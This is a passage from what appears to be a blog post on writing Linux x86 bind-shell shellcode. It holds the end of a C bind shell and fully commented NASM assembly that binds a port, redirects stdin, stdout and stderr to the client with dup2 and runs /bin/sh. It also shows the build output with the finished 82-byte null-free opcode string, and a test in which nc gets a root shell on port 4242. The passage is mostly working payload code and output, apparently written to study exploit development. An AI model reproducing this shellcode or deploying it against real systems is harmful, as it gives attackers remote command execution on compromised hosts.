</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">errno</span> <span class="o">==</span> <span class="n">ERANGE</span> <span class="o">||</span> <span class="p">(</span><span class="n">port</span> <span class="o">&lt;=</span> <span class="mi">1024</span> <span class="o">||</span> <span class="n">port</span> <span class="o">&gt;=</span> <span class="mi">65536</span><span class="p">))</span>
</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;port out of range&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">((</span><span class="n">fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">PF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;socket&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">bzero</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">sa</span><span class="p">);</span>
</span><span class='line'>  <span class="n">sa</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
</span><span class='line'>  <span class="n">sa</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span><span class="n">INADDR_ANY</span><span class="p">);</span>
</span><span class='line'>  <span class="n">sa</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">bind</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">sa</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;bind&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">yes</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">yes</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;setsockopt&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">listen</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;listen&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">sl_client</span> <span class="o">=</span> <span class="k">sizeof</span> <span class="n">sa_client</span><span class="p">;</span>
</span><span class='line'>  <span class="n">fd_client</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">sa_client</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sl_client</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">fd_client</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;accept&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">dup2</span><span class="p">(</span><span class="n">fd_client</span><span class="p">,</span> <span class="n">STDIN_FILENO</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;dup2&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">dup2</span><span class="p">(</span><span class="n">fd_client</span><span class="p">,</span> <span class="n">STDOUT_FILENO</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;dup2&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">dup2</span><span class="p">(</span><span class="n">fd_client</span><span class="p">,</span> <span class="n">STDERR_FILENO</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;dup2&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">execve</span><span class="p">(</span><span class="n">exec_argv</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">exec_argv</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span><span class='line'>  <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;execve&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>    <span class="cm">/* NOTREACHED */</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>And, finally, the commented shellcode:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">global</span> <span class="no">_start</span>
</span><span class='line'>
</span><span class='line'><span class="nf">section</span> <span class="no">.text</span>
</span><span class='line'><span class="nl">_start:</span>
</span><span class='line'>  <span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
</span><span class='line'>  <span class="nf">xor</span> <span class="no">esi</span><span class="p">,</span> <span class="no">esi</span>            <span class="err">;</span> <span class="no">will</span> <span class="no">always</span> <span class="no">hold</span> <span class="no">the</span> <span class="no">value</span> <span class="mi">0</span>
</span><span class='line'>  <span class="nf">cdq</span>                     <span class="err">;</span> <span class="no">set</span> <span class="no">edx</span> <span class="no">to</span> <span class="no">zero</span> <span class="no">as</span> <span class="no">well</span><span class="p">,</span> <span class="no">by</span> <span class="no">sign</span> <span class="no">extending</span> <span class="no">eax</span>
</span><span class='line'>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">ax</span><span class="p">,</span> <span class="mi">0x167</span>           <span class="err">;</span> <span class="no">use</span> <span class="no">mov</span> <span class="no">instead</span> <span class="no">of</span> <span class="no">push</span> <span class="no">imm16</span> <span class="no">and</span> <span class="no">pop</span> <span class="no">r16</span>
</span><span class='line'>  <span class="err">;</span> <span class="nf">int</span> <span class="no">socket</span><span class="p">(</span><span class="no">int</span><span class="p">,</span> <span class="no">int</span><span class="p">,</span> <span class="no">int</span><span class="p">)</span>
</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x2</span>                <span class="err">;</span> <span class="no">PF_INET</span>
</span><span class='line'>  <span class="nf">pop</span> <span class="no">ebx</span>                 <span class="err">;</span> <span class="no">domain</span>
</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x1</span>                <span class="err">;</span> <span class="no">SOCK_STREAM</span>
</span><span class='line'>  <span class="nf">pop</span> <span class="no">ecx</span>                 <span class="err">;</span> <span class="no">type</span>
</span><span class='line'>  <span class="err">;</span> <span class="nf">edx</span> <span class="p">(</span><span class="no">protocol</span><span class="p">)</span> <span class="no">initialized</span> <span class="no">to</span> <span class="no">zero</span> <span class="no">by</span> <span class="no">the</span> <span class="no">cdq</span> <span class="no">instruction</span> <span class="no">above</span>
</span><span class='line'>  <span class="nf">int</span> <span class="mi">0x80</span>
</span><span class='line'>
</span><span class='line'>  <span class="nf">xchg</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">eax</span>           <span class="err">;</span> <span class="no">fd</span> <span class="no">on</span> <span class="no">ebx</span> <span class="no">from</span> <span class="no">this</span> <span class="no">point</span> <span class="no">below</span>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">ax</span><span class="p">,</span> <span class="mi">0x169</span>           <span class="err">;</span> <span class="no">use</span> <span class="no">mov</span> <span class="no">instead</span> <span class="no">of</span> <span class="no">push</span> <span class="no">imm16</span> <span class="no">and</span> <span class="no">pop</span> <span class="no">r16</span>
</span><span class='line'>  <span class="err">;</span> <span class="nf">int</span> <span class="no">bind</span><span class="p">(</span><span class="no">int</span><span class="p">,</span> <span class="no">const</span> <span class="no">struct</span> <span class="no">sockaddr</span> <span class="p">*,</span> <span class="no">socklen_t</span><span class="p">)</span>
</span><span class='line'>  <span class="nf">push</span> <span class="no">esi</span>                <span class="err">;</span> <span class="no">INADDR_ANY</span>
</span><span class='line'>  <span class="nf">push</span> <span class="no">word</span> <span class="no">PORT</span>          <span class="err">;</span> <span class="no">port</span> <span class="no">in</span> <span class="no">network</span> <span class="no">byte</span> <span class="no">order</span>
</span><span class='line'>  <span class="nf">push</span> <span class="no">word</span> <span class="mi">0x2</span>           <span class="err">;</span> <span class="no">AF_INET</span>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">esp</span>            <span class="err">;</span> <span class="no">addr</span>
</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x10</span>               <span class="err">;</span> <span class="mi">16</span> <span class="no">bytes</span> <span class="no">in</span> <span class="no">total</span>
</span><span class='line'>  <span class="nf">pop</span> <span class="no">edx</span>                 <span class="err">;</span> <span class="no">addrlen</span>
</span><span class='line'>  <span class="nf">int</span> <span class="mi">0x80</span>
</span><span class='line'>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">ax</span><span class="p">,</span> <span class="mi">0x16b</span>           <span class="err">;</span> <span class="no">use</span> <span class="no">mov</span> <span class="no">instead</span> <span class="no">of</span> <span class="no">push</span> <span class="no">imm16</span> <span class="no">and</span> <span class="no">pop</span> <span class="no">r16</span>
</span><span class='line'>  <span class="err">;</span> <span class="nf">int</span> <span class="no">listen</span><span class="p">(</span><span class="no">int</span><span class="p">,</span> <span class="no">int</span><span class="p">)</span>
</span><span class='line'>  <span class="nf">xor</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">ecx</span>            <span class="err">;</span> <span class="no">backlog</span>
</span><span class='line'>  <span class="nf">int</span> <span class="mi">0x80</span>
</span><span class='line'>
</span><span class='line'>  <span class="nf">mul</span> <span class="no">ecx</span>                 <span class="err">;</span> <span class="no">set</span> <span class="no">edx</span> <span class="p">(</span><span class="no">addrlen</span><span class="p">)</span> <span class="no">to</span> <span class="no">zero</span>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">ax</span><span class="p">,</span> <span class="mi">0x16c</span>           <span class="err">;</span> <span class="no">use</span> <span class="no">mov</span> <span class="no">instead</span> <span class="no">of</span> <span class="no">push</span> <span class="no">imm16</span> <span class="no">and</span> <span class="no">pop</span> <span class="no">r16</span>
</span><span class='line'>  <span class="err">;</span> <span class="nf">int</span> <span class="no">accept4</span><span class="p">(</span><span class="no">int</span><span class="p">,</span> <span class="no">struct</span> <span class="no">sockaddr</span> <span class="p">*,</span> <span class="no">socklen_t</span> <span class="p">*,</span> <span class="no">int</span><span class="p">)</span>
</span><span class='line'>  <span class="err">;</span> <span class="nf">ecx</span> <span class="p">(</span><span class="no">addr</span><span class="p">)</span> <span class="no">is</span> <span class="no">already</span> <span class="no">zero</span> <span class="no">from</span> <span class="no">the</span> <span class="no">above</span> <span class="no">listen</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span><span class='line'>  <span class="err">;</span> <span class="nf">edx</span> <span class="p">(</span><span class="no">addrlen</span><span class="p">)</span> <span class="no">is</span> <span class="no">already</span> <span class="no">zero</span>
</span><span class='line'>  <span class="err">;</span> <span class="nf">esi</span> <span class="p">(</span><span class="no">flags</span><span class="p">)</span> <span class="no">is</span> <span class="no">already</span> <span class="no">zero</span>
</span><span class='line'>  <span class="nf">int</span> <span class="mi">0x80</span>
</span><span class='line'>
</span><span class='line'>  <span class="nf">xchg</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">eax</span>           <span class="err">;</span> <span class="no">fd</span>
</span><span class='line'>  <span class="nf">inc</span> <span class="no">ecx</span>                 <span class="err">;</span> <span class="no">zero</span> <span class="no">from</span> <span class="no">the</span> <span class="no">above</span> <span class="no">listen</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span><span class='line'>  <span class="nf">inc</span> <span class="no">ecx</span>                 <span class="err">;</span> <span class="no">newfd</span>
</span><span class='line'><span class="nl">bind_dup2_loop:</span>
</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x3f</span>
</span><span class='line'>  <span class="err">;</span> <span class="nf">int</span> <span class="no">dup2</span><span class="p">(</span><span class="no">int</span><span class="p">,</span> <span class="no">int</span><span class="p">)</span>
</span><span class='line'>  <span class="nf">pop</span> <span class="no">eax</span> 
</span><span class='line'>  <span class="no">int</span> <span class="mi">0x80</span>
</span><span class='line'>  <span class="nf">dec</span> <span class="no">ecx</span>
</span><span class='line'>  <span class="nf">jns</span> <span class="no">bind_dup2_loop</span>      <span class="err">;</span> <span class="no">don</span><span class="err">&#39;</span><span class="no">t</span> <span class="no">jump</span> <span class="no">if</span> <span class="no">ecx</span> <span class="no">is</span> <span class="no">positive</span>
</span><span class='line'>
</span><span class='line'>  <span class="nf">push</span> <span class="no">eax</span>                <span class="err">;</span> <span class="no">eax</span> <span class="no">is</span> <span class="no">zero</span> <span class="no">from</span> <span class="no">the</span> <span class="no">dup2</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="no">above</span> <span class="p">(</span><span class="no">stdin</span> <span class="no">fd</span><span class="p">)</span>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">0xb</span>
</span><span class='line'>  <span class="err">;</span> <span class="nf">int</span> <span class="no">execve</span><span class="p">(</span><span class="no">const</span> <span class="no">char</span> <span class="p">*,</span> <span class="no">char</span> <span class="p">*</span><span class="no">const</span> <span class="err">[]</span><span class="p">,</span> <span class="no">char</span> <span class="p">*</span><span class="no">const</span> <span class="err">[]</span><span class="p">)</span>
</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x68732f6e</span>         <span class="err">;</span> <span class="no">n</span><span class="err">/</span><span class="no">sh</span>
</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x69622f2f</span>         <span class="err">;</span> <span class="err">//</span><span class="no">bi</span>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">esp</span>            <span class="err">;</span> <span class="no">filename</span>
</span><span class='line'>  <span class="nf">inc</span> <span class="no">ecx</span>                 <span class="err">;</span> <span class="no">ecx</span> <span class="p">(</span><span class="no">argv</span><span class="p">)</span> <span class="no">is</span> <span class="mi">0xffffffff</span> <span class="no">from</span> <span class="no">the</span> <span class="no">above</span> <span class="no">dup</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span><span class='line'>  <span class="err">;</span> <span class="nf">edx</span> <span class="no">is</span> <span class="no">already</span> <span class="no">zero</span> <span class="no">from</span> <span class="no">the</span> <span class="no">above</span> <span class="no">accept4</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span><span class='line'>  <span class="nf">int</span> <span class="mi">0x80</span>
</span></code></pre></td></tr></table></div></figure>


<p>Running the shellcode is only a matter of configuring the desired listening port with the optional -l command-line argument (4242/tcp by default) and running make. This process also ensures that it is \x00 free and automatically compiles the usual C file that executes the shellcode:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>./configure -l 1337
</span><span class='line'>Using remote host: 0x0101017f
</span><span class='line'>Using listening port: 0x3905
</span><span class='line'>Using remote port: 0x9210
</span><span class='line'><span class="nv">$ </span>./configure -l 1280
</span><span class='line'>Port contains NUL bytes!
</span><span class='line'><span class="nv">$ </span>./configure
</span><span class='line'>Using remote host: 0x0101017f
</span><span class='line'>Using listening port: 0x9210
</span><span class='line'>Using remote port: 0x9210
</span><span class='line'><span class="nv">$ </span><span class="nb">cd </span>0x01-bind/
</span><span class='line'><span class="nv">$ </span>make
</span><span class='line'>nasm  -f elf32 -o bind.o bind.asm
</span><span class='line'>ld -N -zexecstack -o <span class="nb">bind </span>bind.o
</span><span class='line'><span class="m">08048060</span> &lt;_start&gt;:
</span><span class='line'> 8048060:       <span class="m">31</span> c0                   xor    eax,eax
</span><span class='line'> 8048062:       <span class="m">31</span> f6                   xor    esi,esi
</span><span class='line'> 8048064:       <span class="m">99</span>                      cdq
</span><span class='line'> 8048065:       <span class="m">66</span> b8 <span class="m">67</span> <span class="m">01</span>             mov    ax,0x167
</span><span class='line'> 8048069:       6a <span class="m">02</span>                   push   0x2
</span><span class='line'> 804806b:       5b                      pop    ebx
</span><span class='line'> 804806c:       6a <span class="m">01</span>                   push   0x1
</span><span class='line'> 804806e:       <span class="m">59</span>                      pop    ecx
</span><span class='line'> 804806f:       <span class="nb">cd </span><span class="m">80</span>                   int    0x80
</span><span class='line'> 8048071:       <span class="m">93</span>                      xchg   ebx,eax
</span><span class='line'> 8048072:       <span class="m">66</span> b8 <span class="m">69</span> <span class="m">01</span>             mov    ax,0x169
</span><span class='line'> 8048076:       <span class="m">56</span>                      push   esi
</span><span class='line'> 8048077:       <span class="m">66</span> <span class="m">68</span> <span class="m">10</span> <span class="m">92</span>             pushw  0x9210
</span><span class='line'> 804807b:       <span class="m">66</span> 6a <span class="m">02</span>                pushw  0x2
</span><span class='line'> 804807e:       <span class="m">89</span> e1                   mov    ecx,esp
</span><span class='line'> 8048080:       6a <span class="m">10</span>                   push   0x10
</span><span class='line'> 8048082:       5a                      pop    edx
</span><span class='line'> 8048083:       <span class="nb">cd </span><span class="m">80</span>                   int    0x80
</span><span class='line'> 8048085:       <span class="m">66</span> b8 6b <span class="m">01</span>             mov    ax,0x16b
</span><span class='line'> 8048089:       <span class="m">31</span> c9                   xor    ecx,ecx
</span><span class='line'> 804808b:       <span class="nb">cd </span><span class="m">80</span>                   int    0x80
</span><span class='line'> 804808d:       f7 e1                   mul    ecx
</span><span class='line'> 804808f:       <span class="m">66</span> b8 6c <span class="m">01</span>             mov    ax,0x16c
</span><span class='line'> 8048093:       <span class="nb">cd </span><span class="m">80</span>                   int    0x80
</span><span class='line'> 8048095:       <span class="m">93</span>                      xchg   ebx,eax
</span><span class='line'> 8048096:       <span class="m">41</span>                      inc    ecx
</span><span class='line'> 8048097:       <span class="m">41</span>                      inc    ecx
</span><span class='line'>
</span><span class='line'><span class="m">08048098</span> &lt;bind_dup2_loop&gt;:
</span><span class='line'> 8048098:       6a 3f                   push   0x3f
</span><span class='line'> 804809a:       <span class="m">58</span>                      pop    eax
</span><span class='line'> 804809b:       <span class="nb">cd </span><span class="m">80</span>                   int    0x80
</span><span class='line'> 804809d:       <span class="m">49</span>                      dec    ecx
</span><span class='line'> 804809e:       <span class="m">79</span> f8                   jns    <span class="m">8048098</span> &lt;bind_dup2_loop&gt;
</span><span class='line'> 80480a0:       <span class="m">50</span>                      push   eax
</span><span class='line'> 80480a1:       b0 0b                   mov    al,0xb
</span><span class='line'> 80480a3:       <span class="m">68</span> 6e 2f <span class="m">73</span> <span class="m">68</span>          push   0x68732f6e
</span><span class='line'> 80480a8:       <span class="m">68</span> 2f 2f <span class="m">62</span> <span class="m">69</span>          push   0x69622f2f
</span><span class='line'> 80480ad:       <span class="m">89</span> e3                   mov    ebx,esp
</span><span class='line'> 80480af:       <span class="m">41</span>                      inc    ecx
</span><span class='line'> 80480b0:       <span class="nb">cd </span><span class="m">80</span>                   int    0x80
</span><span class='line'>Shellcode size: 82
</span><span class='line'><span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>31<span class="se">\x</span>f6<span class="se">\x</span>99<span class="se">\x</span>66<span class="se">\x</span>b8<span class="se">\x</span>67<span class="se">\x</span>01<span class="se">\x</span>6a<span class="se">\x</span>02<span class="se">\x</span>5b<span class="se">\x</span>6a<span class="se">\x</span>01<span class="se">\x</span>59<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>93<span class="se">\x</span>66<span class="se">\x</span>b8<span class="se">\x</span>69<span class="se">\x</span>01<span class="se">\x</span>56<span class="se">\x</span>66<span class="se">\x</span>68<span class="se">\x</span>10<span class="se">\x</span>92<span class="se">\x</span>66<span class="se">\x</span>6a<span class="se">\x</span>02<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>6a<span class="se">\x</span>10<span class="se">\x</span>5a<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>66<span class="se">\x</span>b8<span class="se">\x</span>6b<span class="se">\x</span>01<span class="se">\x</span>31<span class="se">\x</span>c9<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>f7<span class="se">\x</span>e1<span class="se">\x</span>66<span class="se">\x</span>b8<span class="se">\x</span>6c<span class="se">\x</span>01<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>93<span class="se">\x</span>41<span class="se">\x</span>41<span class="se">\x</span>6a<span class="se">\x</span>3f<span class="se">\x</span>58<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>49<span class="se">\x</span>79<span class="se">\x</span>f8<span class="se">\x</span>50<span class="se">\x</span>b0<span class="se">\x</span>0b<span class="se">\x</span>68<span class="se">\x</span>6e<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>41<span class="se">\x</span>cd<span class="se">\x</span>80
</span><span class='line'>cc -DSHELLCODE<span class="o">=</span><span class="sb">`</span>asm-opcodes <span class="nb">bind</span><span class="sb">`</span> -W -Wall -fno-stack-protector -zexecstack -o shellcode ../skel.c
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># ./shellcode</span>
</span><span class='line'>Shellcode length: 82
</span><span class='line'><span class="nv">$ </span>ss -nlt<span class="p">|</span>grep 4242
</span><span class='line'>LISTEN     <span class="m">0</span>      <span class="m">0</span>            *:4242                     *:*
</span><span class='line'><span class="nv">$ </span>nc -v 127.0.0.1 4242
</span><span class='line'>Connection to 127.0.0.1 <span class="m">4242</span> port <span class="o">[</span>tcp/*<span class="o">]</span> succeeded!
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># make strace</span>
</span><span class='line'><span class="nv">$ </span>head -n35 bind.strace
</span><span class='line'>execve<span class="o">(</span><span class="s2">&quot;./shellcode&quot;</span>, <span class="o">[</span><span class="s2">&quot;./shellcode&quot;</span><span class="o">]</span>, <span class="o">[</span>/* <span class="m">23</span> vars */<span class="o">])</span> <span class="o">=</span> 0
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;Shellcode length: 82\n&quot;</span>, 21<span class="o">)</span>  <span class="o">=</span> 21
</span><span class='line'>socket<span class="o">(</span>AF_INET, SOCK_STREAM, IPPROTO_IP<span class="o">)</span> <span class="o">=</span> 3
</span><span class='line'><span class="nb">bind</span><span class="o">(</span>3, <span class="o">{</span><span class="nv">sa_family</span><span class="o">=</span>AF_INET, <span class="nv">sin_port</span><span class="o">=</span>htons<span class="o">(</span>4242<span class="o">)</span>, <span class="nv">sin_addr</span><span class="o">=</span>inet_addr<span class="o">(</span><span class="s2">&quot;0.0.0.0&quot;</span><span class="o">)}</span>, 16<span class="o">)</span> <span class="o">=</span> 0
</span><span class='line'>listen<span class="o">(</span>3, 0<span class="o">)</span>                            <span class="o">=</span> 0
</span><span class='line'>accept4<span class="o">(</span>3, NULL, NULL, 0<span class="o">)</span>               <span class="o">=</span> 4
</span><span class='line'>dup2<span class="o">(</span>4, 2<span class="o">)</span>                              <span class="o">=</span> 2
</span><span class='line'>dup2<span class="o">(</span>4, 1<span class="o">)</span>                              <span class="o">=</span> 1
</span><span class='line'>dup2<span class="o">(</span>4, 0<span class="o">)</span>                              <span class="o">=</span> 0
